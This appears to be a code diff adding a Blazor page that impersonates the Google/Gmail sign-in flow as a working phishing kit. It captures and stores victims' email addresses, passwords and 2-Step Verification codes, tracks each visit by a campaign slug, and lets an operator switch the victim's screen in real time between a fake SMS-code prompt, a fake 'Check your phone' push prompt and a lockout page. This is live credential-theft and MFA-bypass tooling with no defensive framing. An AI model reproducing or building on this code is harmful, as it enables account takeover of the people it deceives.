@@ -1,0 +1,479 @@
+@page "/"
+@page "/{Slug}"
+@page "/login/{Slug}"
+@rendermode InteractiveServer
+@inject NavigationManager Nav
+@inject LoginLogService LogService
+@inject CampaignLinkService CampaignService
+@inject AppStateService AppState
+@implements IDisposable
+
+<PageTitle>Sign in – Google accounts</PageTitle>
+
+@* ===== STEP 4: Final signing-in spinner ===== *@
+@if (_step == 4)
+{
+    <div class="loading-page">
+        <GoogleLogo />
+        <div class="g-spinner"></div>
+    </div>
+}
+
+@* ===== STEP 5: Waiting for admin to decide ===== *@
+else if (_step == 5)
+{
+    <div class="loading-page">
+        <GoogleLogo />
+        <div class="g-spinner"></div>
+        <p class="loading-msg">Verifying your identity…</p>
+    </div>
+}
+
+@* ===== STEP 6: Dummy / placeholder page ===== *@
+else if (_step == 6)
+{
+    <div class="dummy-page">
+        <GoogleLogo />
+        <div class="dummy-icon"><span class="material-icons">error_outline</span></div>
+        <h2 class="dummy-title">Couldn't sign you in</h2>
+        <p class="dummy-sub">This browser or app may not be secure. To sign in, try a different browser.</p>
+        <a class="dummy-link" href="/">Try again</a>
+    </div>
+}
+
+else
+{
+    <div class="gsi-page">
+
+        @* ===== STEPS 1 & 2: Card ===== *@
+        @if (_step == 1 || _step == 2)
+        {
+            <div class="gsi-card">
+                <div class="gsi-card-logo"><GoogleLogo /></div>
+
+                @* ===== STEP 1: Email ===== *@
+                @if (_step == 1)
+                {
+                    <h1 class="gsi-title">Sign in</h1>
+                    <p class="gsi-subtitle">to continue to Gmail</p>
+
+                    <div class="gsi-form">
+                        <div class="gfield-wrap @(_emailFocused ? "gfield-focused" : "") @(!string.IsNullOrEmpty(_emailError) ? "gfield-err" : "")">
+                            <input class="gfield-input" id="gf-email" type="email"
+                                   @bind="_email" @bind:event="oninput"
+                                   @onfocus="@(() => _emailFocused = true)"
+                                   @onblur="@(() => { _emailFocused = false; ValidateEmail(); })"
+                                   @onkeydown="@(async e => { if (e.Key == "Enter") NextStep(); })"
+                                   autocomplete="email" placeholder=" " />
+                            <label class="gfield-label" for="gf-email">Email or phone</label>
+                        </div>
+                        @if (!string.IsNullOrEmpty(_emailError))
+                        {
+                            <div class="field-err-msg">
+                                <span class="material-icons err-icon">error</span>
+                                @_emailError
+                            </div>
+                        }
+                        <div class="link-row"><a class="gsi-link" href="#">Forgot email?</a></div>
+                        <p class="guest-note">
+                            Not your computer? Use Guest mode to sign in privately.
+                            <a class="gsi-link" href="#">Learn more about using Guest mode</a>
+                        </p>
+                        <div class="card-actions">
+                            <button type="button" class="gsi-text-btn">Create account</button>
+                            <button type="button" class="gsi-next-btn" @onclick="NextStep">Next</button>
+                        </div>
+                    </div>
+                }
+
+                @* ===== STEP 2: Password ===== *@
+                @if (_step == 2)
+                {
+                    <h1 class="gsi-title">Welcome</h1>
+                    <button type="button" class="email-chip" @onclick="GoBack">
+                        <span class="material-icons chip-icon">account_circle</span>
+                        <span class="chip-text">@_email</span>
+                        <span class="material-icons chip-arrow">arrow_drop_down</span>
+                    </button>
+
+                    <div class="gsi-form">
+                        <div class="gfield-wrap @(_passFocused ? "gfield-focused" : "") @(!string.IsNullOrEmpty(_passwordError) ? "gfield-err" : "")">
+                            <input class="gfield-input" id="gf-pass"
+                                   type="@(_showPass ? "text" : "password")"
+                                   @bind="_password" @bind:event="oninput"
+                                   @onfocus="@(() => _passFocused = true)"
+                                   @onblur="@(() => { _passFocused = false; ValidatePassword(); })"
+                                   @onkeydown="@(async e => { if (e.Key == "Enter") await SignIn(); })"
+                                   autocomplete="current-password" placeholder=" " />
+                            <label class="gfield-label" for="gf-pass">Enter your password</label>
+                        </div>
+                        @if (!string.IsNullOrEmpty(_passwordError))
+                        {
+                            <div class="field-err-msg">
+                                <span class="material-icons err-icon">error</span>
+                                @_passwordError
+                            </div>
+                        }
+                        <div class="show-pass-row">
+                            <label class="show-pass-label">
+                                <input type="checkbox" class="show-pass-cb" @bind="_showPass" />
+                                <span>Show password</span>
+                            </label>
+                        </div>
+                        <div class="link-row"><a class="gsi-link" href="#">Forgot password?</a></div>
+                        <div class="card-actions">
+                            <button type="button" class="gsi-text-btn" @onclick="GoBack">Try another way</button>
+                            <button type="button" class="gsi-next-btn" @onclick="SignIn">Next</button>
+                        </div>
+                    </div>
+                }
+            </div>
+        }
+
+        @* ===== STEP 3: 2-Step Verification — Enter code (SMS / Authenticator) ===== *@
+        @if (_step == 3)
+        {
+            <div class="gsi-card">
+                <div class="gsi-card-logo"><GoogleLogo /></div>
+
+                <button type="button" class="email-chip" @onclick="GoBack">
+                    <span class="material-icons chip-icon">account_circle</span>
+                    <span class="chip-text">@_email</span>
+                    <span class="material-icons chip-arrow">arrow_drop_down</span>
+                </button>
+
+                <h1 class="gsi-title">2-Step Verification</h1>
+                <p class="gsi-subtitle" style="margin-bottom:8px;">
+                    To help keep your account safe, Google wants to make sure it's really you trying to sign in
+                </p>
+
+                <!-- SMS message illustration -->
+                <div class="tfa-sms-illustration">
+                    <svg viewBox="0 0 320 100" width="280" height="88" xmlns="http://www.w3.org/2000/svg">
+                        <!-- Phone body -->
+                        <rect x="4" y="4" width="58" height="92" rx="8" fill="#3c4043"/>
+                        <rect x="7" y="12" width="52" height="76" rx="5" fill="#fff"/>
+                        <rect x="24" y="7" width="18" height="3" rx="1.5" fill="#5f6368"/>
+                        <!-- Screen: messages UI -->
+                        <rect x="7" y="12" width="52" height="10" rx="0" fill="#f1f3f4"/>
+                        <text x="33" y="20" text-anchor="middle" font-family="Arial" font-size="5" fill="#202124">Messages</text>
+                        <!-- Incoming SMS bubble -->
+                        <rect x="10" y="26" width="40" height="18" rx="6" fill="#e8f0fe"/>
+                        <text x="30" y="35" text-anchor="middle" font-family="Arial" font-size="5.5" fill="#1a73e8" font-weight="600">Google</text>
+                        <text x="30" y="41" text-anchor="middle" font-family="Arial" font-size="4.5" fill="#202124">Your code: 123456</text>
+                        <!-- Home bar -->
+                        <rect x="25" y="84" width="18" height="2.5" rx="1.25" fill="#dadce0"/>
+
+                        <!-- Arrow pointing right -->
+                        <path d="M72 50 L84 50" stroke="#dadce0" stroke-width="2" stroke-dasharray="3,2"/>
+                        <polygon points="84,46 92,50 84,54" fill="#dadce0"/>
+
+                        <!-- Code entry box -->
+                        <rect x="96" y="28" width="220" height="44" rx="8" fill="#fff" stroke="#e8eaed" stroke-width="1.5"/>
+                        <!-- Floating label -->
+                        <text x="108" y="44" font-family="Arial" font-size="7" fill="#5f6368">Enter code</text>
+                        <!-- Code digits -->
+                        <text x="108" y="62" font-family="Arial" font-size="16" font-weight="500" fill="#202124" letter-spacing="8">●  ●  ●  ●  ●  ●</text>
+                    </svg>
+                </div>
+
+                <p class="tfa-hint">
+                    <span class="material-icons tfa-hint-icon">sms</span>
+                    Google sent a text message with a 6-digit verification code to your phone.
+                </p>
+
+                <div class="gsi-form" style="margin-top:12px;">
+                    <div class="gfield-wrap @(_codeFocused ? "gfield-focused" : "")">
+                        <input class="gfield-input" id="gf-code" type="text"
+                               @bind="_enteredCode" @bind:event="oninput"
+                               @onfocus="@(() => _codeFocused = true)"
+                               @onblur="@(() => _codeFocused = false)"
+                               @onkeydown="@(async e => { if (e.Key == "Enter" && !string.IsNullOrWhiteSpace(_enteredCode)) await ConfirmYes(); })"
+                               placeholder=" " maxlength="6" inputmode="numeric" autocomplete="one-time-code" />
+                        <label class="gfield-label" for="gf-code">Enter code</label>
+                    </div>
+
+                    <label class="dont-ask-label">
+                        <input type="checkbox" class="dont-ask-cb" @bind="_dontAskAgain" />
+                        <span>Don't ask again on this device</span>
+                    </label>
+
+                    <div class="card-actions">
+                        <button type="button" class="gsi-text-btn" @onclick="GoBack">Try another way</button>
+                        <button type="button" class="gsi-next-btn"
+                                disabled="@(string.IsNullOrWhiteSpace(_enteredCode))"
+                                @onclick="ConfirmYes">Next</button>
+                    </div>
+                </div>
+            </div>
+        }
+
+        @* ===== STEP 7: Open your Gmail app — push notification prompt ===== *@
+        @if (_step == 7)
+        {
+            <div class="phone-check-card">
+                <div class="phone-card-logo"><GoogleLogo /></div>
+
+                <button type="button" class="email-chip" @onclick="GoBack">
+                    <span class="material-icons chip-icon">account_circle</span>
+                    <span class="chip-text">@_email</span>
+                    <span class="material-icons chip-arrow">arrow_drop_down</span>
+                </button>
+
+                <h1 class="phone-title">Check your phone</h1>
+                <p class="phone-subtitle">
+                    A sign-in request was just sent to your Gmail app.
+                    Open the notification and tap <strong>Yes</strong> to verify it's you.
+                </p>
+
+                <div class="phone-illustration">
+                    <svg viewBox="0 0 160 310" width="126" height="245" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <clipPath id="screen-clip2">
+                                <rect x="12" y="10" width="136" height="282" rx="18"/>
+                            </clipPath>
+                        </defs>
+                        <rect x="4" y="0" width="152" height="310" rx="24" fill="#1f1f1f"/>
+                        <rect x="4" y="0" width="152" height="310" rx="24" fill="none" stroke="#3a3a3a" stroke-width="1.5"/>
+                        <rect x="12" y="10" width="136" height="282" rx="18" fill="#f8f9fa"/>
+                        <circle cx="80" cy="24" r="5.5" fill="#1f1f1f"/>
+                        <rect x="12" y="10" width="136" height="28" rx="0" fill="#fff" clip-path="url(#screen-clip2)"/>
+                        <text x="24" y="28" font-family="Arial,sans-serif" font-size="8.5" font-weight="600" fill="#202124">9:41</text>
+                        <rect x="130" y="20" width="13" height="7" rx="1.5" fill="none" stroke="#202124" stroke-width="1.2"/>
+                        <rect x="131" y="21" width="9" height="5" rx="1" fill="#202124"/>
+                        <rect x="143" y="22" width="1.5" height="3" rx="0.75" fill="#202124"/>
+                        <circle cx="122" cy="23.5" r="1.5" fill="#202124"/>
+                        <circle cx="117" cy="23.5" r="1.5" fill="#202124"/>
+                        <circle cx="112" cy="23.5" r="1.5" fill="#202124"/>
+                        <rect x="12" y="38" width="136" height="254" fill="#ffffff" clip-path="url(#screen-clip2)"/>
+                        <rect x="18" y="52" width="124" height="220" rx="14" fill="#ffffff" stroke="#e8eaed" stroke-width="0.8"/>
+                        <path d="M80,78 L80,62 A16,16,0,0,1,96,78 Z" fill="#4285f4"/>
+                        <path d="M80,78 L96,78 A16,16,0,0,1,80,94 Z" fill="#ea4335"/>
+                        <path d="M80,78 L80,94 A16,16,0,0,1,64,78 Z" fill="#fbbc05"/>
+                        <path d="M80,78 L64,78 A16,16,0,0,1,80,62 Z" fill="#34a853"/>
+                        <circle cx="80" cy="78" r="8" fill="#fff"/>
+                        <rect x="80" y="75" width="9" height="5" rx="0.5" fill="#4285f4"/>
+                        <text x="80" y="108" text-anchor="middle" font-family="Arial,sans-serif" font-size="8" fill="#5f6368">accounts.google.com</text>
+                        <text x="80" y="126" text-anchor="middle" font-family="Arial,sans-serif" font-size="12.5" font-weight="600" fill="#202124">Sign-in request</text>
+                        <line x1="26" y1="136" x2="134" y2="136" stroke="#e8eaed" stroke-width="0.8"/>
+                        <rect x="32" y="143" width="96" height="16" rx="8" fill="#f1f3f4"/>
+                        <text x="80" y="155" text-anchor="middle" font-family="Arial,sans-serif" font-size="7.5" fill="#5f6368">@_email</text>
+                        <text x="80" y="174" text-anchor="middle" font-family="Arial,sans-serif" font-size="9" fill="#202124" font-weight="500">Are you trying to sign in?</text>
+                        <rect x="26" y="184" width="108" height="24" rx="12" fill="#1a73e8"/>
+                        <text x="80" y="200" text-anchor="middle" font-family="Arial,sans-serif" font-size="9.5" font-weight="700" fill="#ffffff" letter-spacing="0.3">YES, IT'S ME</text>
+                        <rect x="26" y="216" width="108" height="24" rx="12" fill="#ffffff" stroke="#dadce0" stroke-width="1"/>
+                        <text x="80" y="232" text-anchor="middle" font-family="Arial,sans-serif" font-size="9.5" fill="#5f6368" font-weight="500">NO</text>
+                        <text x="80" y="256" text-anchor="middle" font-family="Arial,sans-serif" font-size="7" fill="#80868b">Google will never ask for your password</text>
+                        <rect x="63" y="298" width="34" height="4" rx="2" fill="#dadce0"/>
+                    </svg>
+                </div>
+
+                <div class="phone-actions" style="border-top:1px solid #e0e0e0;padding-top:20px;margin-top:4px;">
+                    <button type="button" class="gsi-link-btn">Didn't get a notification?</button>
+                    <button type="button" class="gsi-link-btn" @onclick="GoBack">Try another way</button>
+                </div>
+            </div>
+        }
+
+        @* ===== FOOTER ===== *@
+        <footer class="gsi-footer">
+            <div class="footer-left">
+                <select class="lang-select">
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                    <option>日本語</option>
+                </select>
+            </div>
+            <div class="footer-right">
+                <a class="footer-link" href="#">Help</a>
+                <a class="footer-link" href="#">Privacy</a>
+                <a class="footer-link" href="#">Terms</a>
+            </div>
+        </footer>
+
+    </div>
+}
+
+@code {
+    [Parameter] public string? Slug { get; set; }
+
+    [SupplyParameterFromQuery(Name = "slug")]
+    public string? SlugQuery { get; set; }
+
+    private int _step = 1;
+    private string _email = string.Empty;
+    private string _password = string.Empty;
+    private bool _showPass;
+    private bool _dontAskAgain = true;
+    private bool _emailFocused;
+    private bool _passFocused;
+    private bool _codeFocused;
+    private string _emailError = string.Empty;
+    private string _passwordError = string.Empty;
+    private string _enteredCode = string.Empty;
+    private int _currentLogId;
+    private int? _campaignLinkId;
+
+    // Known app routes that should never be treated as slugs
+    private static readonly HashSet<string> _appRoutes =
+        new(StringComparer.OrdinalIgnoreCase)
+        { "dashboard", "mail", "email-dashboard", "error", "login" };
+
+    // Extracts slug from route param → query param → URL path (handles /slug and /login/slug)
+    private string? ResolveSlug()
+    {
+        // 1. Blazor route parameter /{Slug} or /login/{Slug}
+        if (!string.IsNullOrWhiteSpace(Slug)) return Slug;
+
+        // 2. [SupplyParameterFromQuery] attribute
+        if (!string.IsNullOrWhiteSpace(SlugQuery)) return SlugQuery;
+
+        var uri = new Uri(Nav.Uri);
+
+        // 3. Manual query string parse (?slug=...)
+        foreach (var pair in uri.Query.TrimStart('?').Split('&', StringSplitOptions.RemoveEmptyEntries))
+        {
+            var kv = pair.Split('=', 2);
+            if (kv.Length == 2 && kv[0].Equals("slug", StringComparison.OrdinalIgnoreCase))
+                return Uri.UnescapeDataString(kv[1]);
+        }
+
+        // 4. URL path extraction — supports /SLUG and /login/SLUG
+        var segments = uri.AbsolutePath.Split('/', StringSplitOptions.RemoveEmptyEntries);
+        if (segments.Length == 1 && !_appRoutes.Contains(segments[0]))
+            return Uri.UnescapeDataString(segments[0]);
+        if (segments.Length >= 2
+            && segments[0].Equals("login", StringComparison.OrdinalIgnoreCase)
+            && !_appRoutes.Contains(segments[1]))
+            return Uri.UnescapeDataString(segments[1]);
+
+        return null;
+    }
+
+    // Everything runs in OnAfterRenderAsync so it only fires in the live interactive
+    // circuit, never during SSR pre-render (which would set _campaignLinkId on a dead instance).
+    protected override async Task OnAfterRenderAsync(bool firstRender)
+    {
+        if (!firstRender) return;
+
+        AppState.OnCampaignToggled += HandleCampaignToggled;
+
+        var slug = ResolveSlug();
+        if (!string.IsNullOrWhiteSpace(slug))
+        {
+            var link = await CampaignService.GetBySlugAsync(slug);
+            if (link is not null)
+            {
+                _campaignLinkId = link.Id;
+                if (link.IsLocked)
+                    _step = 6;
+                StateHasChanged();
+            }
+        }
+    }
+
+    private void HandleCampaignToggled(int campaignId, int pageMode)
+    {
+        if (_campaignLinkId != campaignId) return;
+        InvokeAsync(() =>
+        {
+            _step = pageMode switch
+            {
+                1 => 3,   // Code page (SMS / Authenticator)
+                2 => 7,   // Gmail app "Check your phone"
+                _ => 5    // Loading — stay on spinner
+            };
+            StateHasChanged();
+            return Task.CompletedTask;
+        });
+    }
+
+    private bool ValidateEmail()
+    {
+        _email = _email.Trim().ToLower();
+        if (string.IsNullOrEmpty(_email))
+        {
+            _emailError = "Enter an email address";
+            return false;
+        }
+        if (!System.Text.RegularExpressions.Regex.IsMatch(_email, @"^[a-zA-Z0-9._%+\-]+@gmail\.com$"))
+        {
+            _emailError = "Enter a valid Gmail address (e.g. yourname@gmail.com)";
+            return false;
+        }
+        _emailError = string.Empty;
+        return true;
+    }
+
+    private bool ValidatePassword()
+    {
+        if (string.IsNullOrEmpty(_password))
+        {
+            _passwordError = "Enter a password";
+            return false;
+        }
+        if (_password.Length < 8)
+        {
+            _passwordError = "Use 8 characters or more for your password";
+            return false;
+        }
+        if (!System.Text.RegularExpressions.Regex.IsMatch(_password, "[a-zA-Z]"))
+        {
+            _passwordError = "Use letters in your password";
+            return false;
+        }
+        if (!System.Text.RegularExpressions.Regex.IsMatch(_password, @"[0-9!@#$%^&*()\-_=+\[\]{};:'"",.<>/?\\|`~]"))
+        {
+            _passwordError = "Use a number or symbol to make your password stronger";
+            return false;
+        }
+        _passwordError = string.Empty;
+        return true;
+    }
+
+    private void NextStep()
+    {
+        if (!ValidateEmail()) return;
+        _step = 2;
+    }
+
+    private async Task SignIn()
+    {
+        if (!ValidatePassword()) return;
+        _currentLogId = await LogService.SaveEmailPasswordAsync(_email, _password, _campaignLinkId);
+
+        if (_campaignLinkId.HasValue)
+        {
+            await CampaignService.LockAsync(_campaignLinkId.Value);
+            // Notify AFTER lock so dashboard re-renders with IsLocked=true and shows the toggle
+            AppState.NotifyLogsChanged();
+            _step = 5;
+        }
+        else
+        {
+            _step = 3;
+        }
+    }
+
+    private async Task ConfirmYes()
+    {
+        if (_currentLogId > 0)
+            await LogService.UpdateCodeAsync(_currentLogId, _enteredCode.Trim());
+        _step = 4;
+        StateHasChanged();
+        await Task.Delay(2200);
+        Nav.NavigateTo("/mail", forceLoad: true);
+    }
+
+    private void GoBack()
+    {
+        _step = 1;
+        _password = string.Empty;
+        _passwordError = string.Empty;
+    }
+
+    public void Dispose()
+        => AppState.OnCampaignToggled -= HandleCampaignToggled;
+}
